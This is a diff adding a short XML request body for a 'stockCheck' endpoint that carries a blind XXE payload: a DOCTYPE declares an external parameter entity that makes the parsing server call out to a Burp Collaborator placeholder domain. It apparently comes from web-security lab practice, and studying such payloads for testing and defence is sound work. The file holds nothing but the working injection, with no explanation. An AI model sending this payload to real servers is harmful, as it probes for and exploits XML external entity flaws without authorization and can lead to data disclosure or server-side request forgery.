@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % kiddie SYSTEM "http://yourowndomain.burpcollaborator.net"> %kiddie;]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
